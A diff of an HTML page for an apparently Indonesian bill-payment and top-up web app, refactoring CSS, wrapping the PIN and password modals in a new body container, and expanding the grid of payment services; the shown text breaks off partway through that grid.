@@ -39,10 +39,7 @@
   
         body { background-color: var(--bg-body); color: var(--text-main); display: flex; justify-content: center; transition: background 0.3s ease; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; scroll-behavior: smooth;}
 
-        img {
-            -webkit-user-drag: none; 
-            pointer-events: none;   
-        }
+        img { -webkit-user-drag: none; pointer-events: none; }
   
         .app-container { width: 100%; max-width: 480px; background-color: var(--bg-container); min-height: 100vh; position: relative; padding-top: 75px; padding-bottom: 30px; transition: background 0.3s ease; overflow-x: hidden;}
         
@@ -52,7 +49,6 @@
         .btn-icon:active { transform: scale(0.9); }
         
         .search-box { display: flex; align-items: center; background: var(--bg-input); padding: 10px 14px; border-radius: 14px; flex: 1; border: 1px solid transparent; transition: all 0.3s ease; }
-        .search-box:focus-within { border-color: var(--primary); }
         .search-box i { color: var(--text-muted); font-size: 14px; }
         .search-box input { background: transparent; border: none; outline: none; color: var(--text-main); width: 100%; margin-left: 8px; font-size: 13px; font-weight: 500; }
 
@@ -61,7 +57,7 @@
 
         .sidenav-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--overlay); z-index: 1001; display: none; opacity: 0; transition: opacity 0.3s ease; }
         .sidenav-overlay.show { display: block; opacity: 1; }
-        .sidenav { position: fixed; top: 0; left: -280px; width: 280px; height: 100%; background: var(--bg-card); z-index: 1002; transition: left 0.3s ease; display: flex; flex-direction: column; }
+        .sidenav { position: fixed; top: 0; left: -280px; width: 280px; height: 100%; background: var(--bg-card); z-index: 1002; transition: left 0.3s ease, transform 0.3s ease; display: flex; flex-direction: column; }
         .sidenav.open { left: 0; }
         .sidenav-header { padding: 25px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); }
         .sidenav-header h3 { font-size: 20px; color: var(--primary); font-weight: 800; letter-spacing: -0.5px;}
@@ -109,12 +105,7 @@
             to { transform: translateY(0); opacity: 1; }
         }
         .fake-ticker-container { margin-bottom:-7px;display: flex; flex-direction: column; }
-        .fake-ticker-item { 
-            display: flex; align-items: center; justify-content: space-between; 
-            background: var(--bg-card); padding: 12px; border-radius: 12px; 
-            margin-bottom: 10px; border: 1px solid var(--border-color); 
-            animation: slideInDown 0.4s cubic-bezier(0.25, 1, 0.5, 1) forwards;
-        }
+        .fake-ticker-item { display: flex; align-items: center; justify-content: space-between; background: var(--bg-card); padding: 12px; border-radius: 12px; margin-bottom: 10px; border: 1px solid var(--border-color); animation: slideInDown 0.4s cubic-bezier(0.25, 1, 0.5, 1) forwards; }
         .fake-ticker-icon { width: 45px; height: 45px; object-fit: contain; border-radius: 8px; background:none; padding: 4px;}
         .fake-ticker-info { flex: 1; margin-left: 12px; }
         .fake-ticker-info h4 { font-size: 13px; font-weight: 700; color: var(--text-main); margin-bottom: 4px; }
@@ -141,39 +132,14 @@
         .flashsale-grid { display: flex; gap: 15px; overflow-x: auto; scroll-snap-type: x mandatory;}
         .flashsale-grid::-webkit-scrollbar { display: none; }
         
-        .fs-item {
-            min-width: 170px;
-            background: var(--bg-card);
-            border-radius: 18px;
-            padding: 0;
-            border: 1px solid var(--border-color);
-            scroll-snap-align: start;
-            position: relative;
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
-            transition: transform 0.2s;
-        }
-        .fs-header-img {
-            height: 90px; 
-            background-size: cover !important;
-            background-position: center !important;
-            display: flex; align-items: flex-start; justify-content: flex-start; 
-            position: relative;
-        }
-        .fs-badge {
-            position: absolute; top: 10px; left: 10px; 
-            background: rgba(0,0,0,0.5); backdrop-filter: blur(5px); 
-            color: #fff; font-size: 9px; font-weight: 800; 
-            padding: 4px 8px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.3);
-        }
+        .fs-item { min-width: calc((100% - 15px) / 2); background: var(--bg-card); border-radius: 18px; padding: 0; border: 1px solid var(--border-color); scroll-snap-align: start; position: relative; display: flex; flex-direction: column; overflow: hidden; transition: transform 0.2s; }
+        .fs-header-img { height: 90px; background-size: cover !important; background-position: center !important; display: flex; align-items: flex-start; justify-content: flex-start; position: relative; }
+        .fs-badge { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.5); backdrop-filter: blur(5px); color: #fff; font-size: 9px; font-weight: 800; padding: 4px 8px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.3); }
         .fs-content { padding: 12px; display:flex; flex-direction: column; flex: 1; }
         .fs-name { font-size: 14px; font-weight: 700; color: var(--text-main); margin-bottom: 10px; white-space: nowrap; overflow: hidden; text-align: center; text-overflow: ellipsis;}
         .fs-price-strike { font-size: 12px; color: var(--text-muted); text-align: center; text-decoration: line-through;}
         .fs-price { font-size: 16px; color: var(--danger); text-align: center; font-weight: 800; margin-bottom: 12px; flex: 1;}
-        .fs-add-btn {
-            width: 100%; padding: 10px; border-radius: 12px; background: rgba(239, 68, 68, 0.1); color: var(--danger); border: none; cursor: pointer; font-weight: 700; font-size: 12px; transition: all 0.2s;
-        }
+        .fs-add-btn { width: 100%; padding: 10px; border-radius: 12px; background: rgba(239, 68, 68, 0.1); color: var(--danger); border: none; cursor: pointer; font-weight: 700; font-size: 12px; transition: all 0.2s; }
         .fs-add-btn:active { background: rgba(239, 68, 68, 0.2); transform: scale(0.97); }
 
         .pass-input-wrapper { position: relative; width: 100%; }
@@ -198,12 +164,15 @@
 
         .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--overlay); display: none; justify-content: center; align-items: center; z-index: 99999; opacity: 0; transition: opacity 0.3s ease; backdrop-filter: blur(5px);}
         .modal-overlay.show { display: flex; opacity: 1; }
-        .modal-content { background: var(--bg-container); width: 90%; max-width: 420px; padding: 25px; border-radius: 24px; text-align: left; transform: translateY(20px) scale(0.95); transition: all 0.3s cubic-bezier(0.25, 1, 0.5, 1); border: 1px solid var(--border-color); max-height: 90vh; overflow-y: auto;}
+        
+        .modal-content { background: var(--bg-container); width: 90%; max-width: 420px; padding: 0; border-radius: 24px; text-align: left; transform: translateY(20px) scale(0.95); transition: all 0.3s cubic-bezier(0.25, 1, 0.5, 1); border: 1px solid var(--border-color); max-height: 90vh; display: flex; flex-direction: column; overflow: hidden; }
         .modal-overlay.show .modal-content { transform: translateY(0) scale(1); }
         
-        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; padding: 20px 25px; background: var(--bg-card); border-bottom: 1px solid var(--border-color); margin-bottom: 0; flex-shrink: 0; }
         .modal-header h3 { color: var(--text-main); font-size: 18px; margin: 0; }
         .modal-header .btn-icon { font-size: 24px; background: var(--bg-input); width: 36px; height: 36px; border-radius: 50%; color: var(--text-muted); }
+
+        .modal-body { padding: 25px; overflow-y: auto; flex: 1; }
 
         .input-group { margin-bottom: 16px; }
         .input-group label { display: block; font-size: 13px; color: var(--text-muted); margin-bottom: 8px; font-weight: 600; }
@@ -212,16 +181,10 @@
         
         .btn-modal { width: 100%; padding: 15px; background: var(--primary); color: #fff; border: none; border-radius: 14px; font-weight: 700; font-size: 15px; cursor: pointer; margin-top: 10px; transition: all 0.2s; text-align: center;}
         .btn-modal:active { transform: scale(0.98); }
-        .btn-modal-outline { background: transparent; color: var(--text-main); border: 1px solid var(--border-color); box-shadow: none; }
-        .btn-modal-danger { background: rgba(239, 68, 68, 0.1); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.2); box-shadow: none; }
+        .btn-modal-outline { background: transparent; color: var(--text-main); border: 1px solid var(--border-color); }
+        .btn-modal-danger { background: rgba(239, 68, 68, 0.1); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.2); }
 
-        .quick-nominal-btn {
-            flex: 1; min-width: 30%; padding: 10px 5px;
-            background: var(--bg-input); color: var(--text-main);
-            border: 1px solid var(--border-color); border-radius: 12px;
-            font-size: 12px; font-weight: 700; cursor: pointer;
-            transition: all 0.2s; text-align: center;
-        }
+        .quick-nominal-btn { flex: 1; min-width: 30%; padding: 10px 5px; background: var(--bg-input); color: var(--text-main); border: 1px solid var(--border-color); border-radius: 12px; font-size: 12px; font-weight: 700; cursor: pointer; transition: all 0.2s; text-align: center; }
         .quick-nominal-btn:hover { border-color: var(--primary); background: rgba(59,130,246,0.1); color: var(--primary); }
         .quick-nominal-btn:active { transform: scale(0.95); }
 
@@ -245,25 +208,17 @@
         .cf-logo-box { display: flex; flex-direction: column; align-items: center; gap: 4px; }
         .cf-logo-box span { font-size: 10px; color: #999; }
 
-        .help-modal-fullscreen {
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            background: #ffffff; display: flex; flex-direction: column;
-            transform: translateY(100%); transition: transform 0.3s cubic-bezier(0.25, 1, 0.5, 1);
-            z-index: 10000;
-        }
+        .help-modal-fullscreen { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #ffffff; display: flex; flex-direction: column; transform: translateY(100%); transition: transform 0.3s cubic-bezier(0.25, 1, 0.5, 1); z-index: 10000; }
         .modal-overlay.show .help-modal-fullscreen { transform: translateY(0); }
-        .help-header {
-            display: flex; justify-content: space-between; align-items: center;
-            padding: 15px 20px; background: #12161f;
-        }
+        .help-header { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; background: #12161f; }
         .help-iframe-view { flex: 1; width: 100%; height: 100%; border: none; }
         @keyframes blink-dot { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
 
-        .receipt-box { background: #ffffff; color: #1e293b; padding: 20px; border-radius: 16px; font-family: 'Courier New', Courier, monospace; border: 1px dashed #cbd5e1; margin: 15px 0; font-size: 13px; }
-        .receipt-header { text-align: center; font-weight: bold; font-size: 16px; margin-bottom: 15px; border-bottom: 1px dashed #94a3b8; padding-bottom: 10px; }
+        .receipt-box { background: var(--bg-input); color: var(--text-main); padding: 20px; border-radius: 16px; font-family: 'Courier New', Courier, monospace; border: 1px dashed var(--border-color); margin: 15px 0; font-size: 13px; }
+        .receipt-header { text-align: center; font-weight: bold; font-size: 16px; margin-bottom: 15px; border-bottom: 1px dashed var(--border-color); padding-bottom: 10px; }
         .receipt-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
-        .receipt-footer { border-top: 1px dashed #94a3b8; margin-top: 15px; padding-top: 10px; text-align: center; font-weight: bold; }
-
+        .receipt-footer { border-top: 1px dashed var(--border-color); margin-top: 15px; padding-top: 10px; text-align: center; font-weight: bold; }
+        
         .notif-popup-item { padding: 14px; border-radius: 14px; background: var(--bg-input); margin-bottom: 12px; border: 1px solid var(--border-color); position: relative; }
         .btn-claim-bonus { padding: 8px 16px; background: var(--success); border: none; border-radius: 8px; color: #fff; font-weight: 700; font-size: 12px; cursor: pointer; margin-top: 8px; display: inline-block; }
 
@@ -282,85 +237,34 @@
         ::-webkit-scrollbar { width: 6px; }
         ::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 10px; }
 
-        .ref-card {
-           background: var(--bg-body);
-           padding: 20px;
-           border-radius: 20px;
-           color: var(--text-main);
-           margin-bottom: 20px;
-           text-align: center;
-         }
+        .ref-card { background: var(--bg-body); padding: 20px; border-radius: 20px; color: var(--text-main); margin-bottom: 20px; text-align: center; }
+        .ref-code-box { background: var(--bg-card); padding: 10px 20px; border-radius: 12px; display: inline-block; font-weight: 800; font-size: 18px; letter-spacing: 1px; margin-top: 10px; }
+        .downline-item { display: flex; align-items: center; padding: 15px; background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 16px; margin-bottom: 10px; transition: transform 0.2s; }
+        .downline-icon { width: 40px; height: 40px; background: rgba(59,130,246,0.1); color: var(--primary); display: flex; align-items: center; justify-content: center; border-radius: 12px; font-size: 18px; margin-right: 15px; }
+        .downline-info h4 { font-size: 14px; margin-bottom: 2px; }
+        .downline-info p { font-size: 11px; color: var(--text-muted); }
 
-         .ref-code-box {
-           background: var(--bg-card);
-           padding: 10px 20px;
-           border-radius: 12px;
-           display: inline-block;
-           font-weight: 800;
-           font-size: 18px;
-           letter-spacing: 1px;
-           margin-top: 10px;
-         }
+        .pin-lock-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-container); z-index: 1000000;  display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px 20px; }
+        .pin-lock-title { font-size: 18px; font-weight: 700; color: var(--text-main); margin-bottom: 8px; }
+        .pin-lock-subtitle { font-size: 13px; color: var(--text-muted); text-align: center; margin-bottom: 30px; }
+        
+        .pin-dots-container { display: flex; gap: 15px; margin-bottom: 40px; }
+        .pin-dot { width: 16px; height: 16px; border-radius: 50%; border: 2px solid var(--border-color); background: transparent; transition: all 0.2s; }
+        .pin-dot.filled { background: var(--primary); border-color: var(--primary); }
+        
+        .keypad-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; width: 100%; max-width: 300px; margin-bottom: 20px; }
+        .key-btn { background: transparent; border: none; color: var(--text-main); font-size: 27px; font-weight: 600; height: 70px; border-radius: 50px; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: background 0.1s; }
+        .key-btn:active { background: rgba(255,255,255,0.1); transform: scale(0.95); }
+        [data-theme="light"] .key-btn:active { background: rgba(0,0,0,0.05); }
+        .key-btn.text-key { font-size: 15px; font-weight: 700; color: var(--text-muted); }
 
-        .downline-item {
-           display: flex;
-           align-items: center;
-           padding: 15px;
-           background: var(--bg-card);
-           border: 1px solid var(--border-color);
-           border-radius: 16px;
-           margin-bottom: 10px;
-           transition: transform 0.2s;
-         }
-
-        .downline-icon {
-           width: 40px;
-           height: 40px;
-           background: rgba(59,130,246,0.1);
-           color: var(--primary);
-           display: flex;
-           align-items: center;
-           justify-content: center;
-           border-radius: 12px;
-           font-size: 18px;
-           margin-right: 15px;
-         }
-
-         .downline-info h4 { font-size: 14px; margin-bottom: 2px; }
-         .downline-info p { font-size: 11px; color: var(--text-muted); }
-
-         .pin-lock-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: var(--bg-container); z-index: 1000000; 
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            padding: 40px 20px;
-         }
-         .pin-lock-title { font-size: 18px; font-weight: 700; color: var(--text-main); margin-bottom: 8px; }
-         .pin-lock-subtitle { font-size: 13px; color: var(--text-muted); text-align: center; margin-bottom: 30px; }
-         
-         .pin-dots-container { display: flex; gap: 15px; margin-bottom: 40px; }
-         .pin-dot { width: 16px; height: 16px; border-radius: 50%; border: 2px solid var(--border-color); background: transparent; transition: all 0.2s; }
-         .pin-dot.filled { background: var(--primary); border-color: var(--primary); }
-         
-         .keypad-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; width: 100%; max-width: 300px; margin-bottom: 20px; }
-         .key-btn {
-            background: transparent; border: none;
-            color: var(--text-main); font-size: 27px; font-weight: 600;
-            height: 70px; border-radius: 50px; display: flex; align-items: center; justify-content: center;
-            cursor: pointer; transition: background 0.1s;
-         }
-         .key-btn:active { background: rgba(255,255,255,0.1); transform: scale(0.95); }
-         [data-theme="light"] .key-btn:active { background: rgba(0,0,0,0.05); }
-         .key-btn.text-key { font-size: 15px; font-weight: 700; color: var(--text-muted); }
-
-         @keyframes shakeError {
+        @keyframes shakeError {
             0%, 100% { transform: translateX(0); }
             25% { transform: translateX(-10px); }
             50% { transform: translateX(10px); }
             75% { transform: translateX(-10px); }
-         }
-         .shake-animation { animation: shakeError 0.4s ease-in-out; }
-
+        }
+        .shake-animation { animation: shakeError 0.4s ease-in-out; }
     </style>
 </head>
 <body>
@@ -371,8 +275,12 @@
         <div class="pin-lock-subtitle">Masukkan PIN untuk mengakses akun mitra</div>
         
         <div class="pin-dots-container" id="login-pin-dots">
-            <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
-            <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
         </div>
 
         <div class="keypad-grid">
@@ -416,9 +324,8 @@
                 </div>
             </div>
         </div>
-<span id="nav-membership-badge" style="
-    display: none; justify-content: center; align-items: center; font-size: 14px; padding: 7px; background: rgba(59,130,246,0.2); color: var(--primary); border-bottom: 1px solid var(--border-color); font-weight: 800;
-">Standar</span>
+        <span id="nav-membership-badge" style="display: none; justify-content: center; align-items: center; font-size: 14px; padding: 7px; background: rgba(59,130,246,0.2); color: var(--primary); border-bottom: 1px solid var(--border-color); font-weight: 800;">Standar</span>
+        
         <div class="sidenav-menu">
             <a href="#" onclick="toggleNav()"><i class="bi bi-house-door"></i> <span>Beranda</span></a>
             <a href="#" onclick="toggleNav(); openDepositModal();"><i class="bi bi-wallet2"></i> <span>Isi Saldo</span></a>
@@ -620,9 +527,8 @@
         </div>
 
         <div class="services-section" id="section-fake-ticker" style="display:none;">
-        <div class="section-title" id="transaksi-title"></div>
-              <div class="fake-ticker-container" id="fake-ticker-box">
-                </div>
+            <div class="section-title" id="transaksi-title"></div>
+            <div class="fake-ticker-container" id="fake-ticker-box"></div>
         </div>
 
         <div class="banner-slider-container">
@@ -674,8 +580,7 @@
                 Transaksi Terakhir
                 <a onclick="showFullHistory()" style="font-size: 13px; color: var(--primary); text-decoration: none; font-weight: 700; cursor: pointer;">Lihat Semua</a>
             </div>
-            <div class="history-list" id="history-box">
-                </div>
+            <div class="history-list" id="history-box"></div>
         </div>
     </div>
 
@@ -685,15 +590,17 @@
                 <h3>Buat PIN Login</h3>
                 <button class="btn-icon" onclick="closeTargetModal('setup-login-pin-modal')"><i class="bi bi-x-lg"></i></button>
             </div>
-            <div class="input-group">
-                <label>Buat PIN</label>
-                <input type="password" id="login-pin-1" maxlength="6" pattern="[0-9]*" inputmode="numeric" placeholder="Masukkan 6 digit angka">
+            <div class="modal-body">
+                <div class="input-group">
+                    <label>Buat PIN</label>
+                    <input type="password" id="login-pin-1" maxlength="6" pattern="[0-9]*" inputmode="numeric" placeholder="Masukkan 6 digit angka">
+                </div>
+                <div class="input-group">
+                    <label>Konfirmasi PIN</label>
+                    <input type="password" id="login-pin-2" maxlength="6" pattern="[0-9]*" inputmode="numeric" placeholder="Konfirmasi 6 digit angka">
+                </div>
+                <button class="btn-modal" onclick="processSetupLoginPin()">Simpan PIN</button>
             </div>
-            <div class="input-group">
-                <label>Konfirmasi PIN</label>
-                <input type="password" id="login-pin-2" maxlength="6" pattern="[0-9]*" inputmode="numeric" placeholder="Konfirmasi 6 digit angka">
-            </div>
-            <button class="btn-modal" onclick="processSetupLoginPin()">Simpan PIN</button>
         </div>
     </div>
 
@@ -702,15 +609,17 @@
             <div class="modal-header">
                 <h3>Reset PIN Login</h3>
             </div>
-            <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 15px;">Anda salah memasukkan PIN silakan konfirmasi password untuk mereset.</p>
-            <div class="input-group">
-                <label>Password Akun</label>
-                <div class="pass-input-wrapper">
-                    <input type="password" id="reset-login-pin-pwd-input" placeholder="Masukkan password akun Anda">
-                    <i class="bi bi-eye-slash pass-toggle-icon" onclick="togglePasswordVisibility('reset-login-pin-pwd-input', this)"></i>
+            <div class="modal-body">
+                <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 15px;">Anda salah memasukkan PIN silakan konfirmasi password untuk mereset.</p>
+                <div class="input-group">
+                    <label>Password Akun</label>
+                    <div class="pass-input-wrapper">
+                        <input type="password" id="reset-login-pin-pwd-input" placeholder="Masukkan password akun Anda">
+                        <i class="bi bi-eye-slash pass-toggle-icon" onclick="togglePasswordVisibility('reset-login-pin-pwd-input', this)"></i>
+                    </div>
                 </div>
+                <button class="btn-modal" onclick="processResetLoginPinPwd()">Verifikasi</button>
             </div>
-            <button class="btn-modal" onclick="processResetLoginPinPwd()">Verifikasi</button>
         </div>
     </div>
 
@@ -720,84 +629,196 @@
                 <h3>Hapus PIN Login</h3>
                 <button class="btn-icon" onclick="closeTargetModal('remove-login-pin-modal')"><i class="bi bi-x-lg"></i></button>
             </div>
-            <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 15px;">Masukkan password akun Anda untuk mengonfirmasi penghapusan.</p>
-            <div class="input-group">
-                <label>Password Akun</label>
-                <div class="pass-input-wrapper">
-                    <input type="password" id="remove-login-pin-pwd-input" placeholder="Masukkan password akun">
-                    <i class="bi bi-eye-slash pass-toggle-icon" onclick="togglePasswordVisibility('remove-login-pin-pwd-input', this)"></i>
+            <div class="modal-body">
+                <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 15px;">Masukkan password akun Anda untuk mengonfirmasi penghapusan.</p>
+                <div class="input-group">
+                    <label>Password Akun</label>
+                    <div class="pass-input-wrapper">
+                        <input type="password" id="remove-login-pin-pwd-input" placeholder="Masukkan password akun">
+                        <i class="bi bi-eye-slash pass-toggle-icon" onclick="togglePasswordVisibility('remove-login-pin-pwd-input', this)"></i>
+                    </div>
                 </div>
+                <button class="btn-modal btn-modal-danger" onclick="processRemoveLoginPin()">Hapus PIN</button>
             </div>
-            <button class="btn-modal btn-modal-danger" onclick="processRemoveLoginPin()">Hapus PIN</button>
         </div>
     </div>
 
     <div id="lainnya-modal" class="modal-overlay">
-        <div class="modal-content" style="max-height: 85vh;">
+        <div class="modal-content">
             <div class="modal-header">
                 <h3>Semua Layanan</h3>
                 <button class="btn-icon" onclick="closeTargetModal('lainnya-modal')"><i class="bi bi-x-lg"></i></button>
             </div>
-            <div class="service-grid" style="grid-template-columns: repeat(3, 1fr); gap: 20px 10px; margin-top: 10px;">
-                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Tiket Pesawat')">
-                    <div class="service-icon"><i class="bi bi-airplane-fill"></i></div>
-                    <div class="service-name">Tiket Pesawat</div>
-                </div>
-                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Tiket Kereta')">
-                    <div class="service-icon"><i class="bi bi-train-front"></i></div>
-                    <div class="service-name">Tiket Kereta</div>
-                </div>
-                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Telkom')">
-                    <div class="service-icon"><i class="bi bi-telephone-fill"></i></div>
-                    <div class="service-name">Masa Aktif</div>
-                </div>
-                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Internet')">
-                    <div class="service-icon"><i class="bi bi-router"></i></div>
-                    <div class="service-name">Wifi</div>
-                </div>
-                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('PBB')">
-                    <div class="service-icon"><i class="bi bi-buildings"></i></div>
-                    <div class="service-name">Pajak PBB</div>
-                </div>
-                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Samsat')">
-                    <div class="service-icon"><i class="bi bi-car-front"></i></div>
-                    <div class="service-name">E-Samsat</div>
-                </div>
-                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Asuransi')">
-                    <div class="service-icon"><i class="bi bi-shield-check"></i></div>
-                    <div class="service-name">Asuransi</div>
-                </div>
-                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('BPJS Ketenagakerjaan')">
-                    <div class="service-icon"><i class="bi bi-briefcase-fill"></i></div>
-                    <div class="service-name">BPJS TK</div>
-                </div>
-                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Gas Negara')">
-                    <div class="service-icon"><i class="bi bi-fire"></i></div>
-                    <div class="service-name">Gas PGN</div>
-                </div>
-                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('TV Kabel')">
-                    <div class="service-icon"><i class="bi bi-tv"></i></div>
-                    <div class="service-name">TV Kabel</div>
-                </div>
-                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Voucher Streaming')">
-                    <div class="service-icon"><i class="bi bi-play-btn-fill"></i></div>
-                    <div class="service-name">Streaming</div>
-                </div>
-                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Zakat')">
-                    <div class="service-icon"><i class="bi bi-heart-fill"></i></div>
-                    <div class="service-name">Zakat & Donasi</div>
-                </div>
-                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Kartu Kredit')">
-                    <div class="service-icon"><i class="bi bi-credit-card"></i></div>
-                    <div class="service-name">Kartu Kredit</div>
-                </div>
-                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Multifinance')">
-                    <div class="service-icon"><i class="bi bi-cash-stack"></i></div>
-                    <div class="service-name">Multifinance</div>
-                </div>
-                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Pasca Bayar')">
-                    <div class="service-icon"><i class="bi bi-receipt"></i></div>
-                    <div class="service-name">Pasca Bayar</div>
+            <div class="modal-body">
+                <div class="service-grid" style="grid-template-columns: repeat(3, 1fr); gap: 20px 10px;">
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Pulsa')">
+                        <div class="service-icon"><i class="bi bi-phone"></i></div>
+                        <div class="service-name">Pulsa Reguler</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Paket Data')">
+                        <div class="service-icon"><i class="bi bi-wifi"></i></div>
+                        <div class="service-name">Paket Data</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Paket SMS & Nelpon')">
+                        <div class="service-icon"><i class="bi bi-telephone-outbound"></i></div>
+                        <div class="service-name">SMS & Nelpon</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Transfer Pulsa')">
+                        <div class="service-icon"><i class="bi bi-arrow-left-right"></i></div>
+                        <div class="service-name">Transfer Pulsa</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Masa Aktif')">
+                        <div class="service-icon"><i class="bi bi-calendar2-check"></i></div>
+                        <div class="service-name">Masa Aktif</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Topup E-Wallet')">
+                        <div class="service-icon"><i class="bi bi-wallet2"></i></div>
+                        <div class="service-name">Topup E-Wallet</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Saldo Driver')">
+                        <div class="service-icon"><i class="bi bi-car-front-fill"></i></div>
+                        <div class="service-name">Saldo Driver</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('E-Toll')">
+                        <div class="service-icon"><i class="bi bi-signpost-2-fill"></i></div>
+                        <div class="service-name">Topup E-Toll</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Token PLN')">
+                        <div class="service-icon"><i class="bi bi-lightning-charge"></i></div>
+                        <div class="service-name">Token PLN</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Tagihan PLN')">
+                        <div class="service-icon"><i class="bi bi-lightbulb"></i></div>
+                        <div class="service-name">Tagihan PLN</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('PDAM')">
+                        <div class="service-icon"><i class="bi bi-droplet"></i></div>
+                        <div class="service-name">Air PDAM</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Gas Negara')">
+                        <div class="service-icon"><i class="bi bi-fire"></i></div>
+                        <div class="service-name">Gas PGN</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Internet')">
+                        <div class="service-icon"><i class="bi bi-router"></i></div>
+                        <div class="service-name">Wifi / Indihome</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('TV Kabel')">
+                        <div class="service-icon"><i class="bi bi-tv"></i></div>
+                        <div class="service-name">TV Kabel</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Voucher Streaming')">
+                        <div class="service-icon"><i class="bi bi-play-btn-fill"></i></div>
+                        <div class="service-name">Streaming</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Bioskop')">
+                        <div class="service-icon"><i class="bi bi-film"></i></div>
+                        <div class="service-name">Tiket Bioskop</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Event')">
+                        <div class="service-icon"><i class="bi bi-ticket-perforated-fill"></i></div>
+                        <div class="service-name">Tiket Event</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Topup Game')">
+                        <div class="service-icon"><i class="bi bi-controller"></i></div>
+                        <div class="service-name">Topup Game</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Steam Wallet')">
+                        <div class="service-icon"><i class="bi bi-pc-display"></i></div>
+                        <div class="service-name">Steam Wallet</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Google Play')">
+                        <div class="service-icon"><i class="bi bi-google-play"></i></div>
+                        <div class="service-name">Google Play</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Tiket Pesawat')">
+                        <div class="service-icon"><i class="bi bi-airplane-fill"></i></div>
+                        <div class="service-name">Pesawat</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Tiket Kereta')">
+                        <div class="service-icon"><i class="bi bi-train-front"></i></div>
+                        <div class="service-name">Kereta Api</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Tiket Bus')">
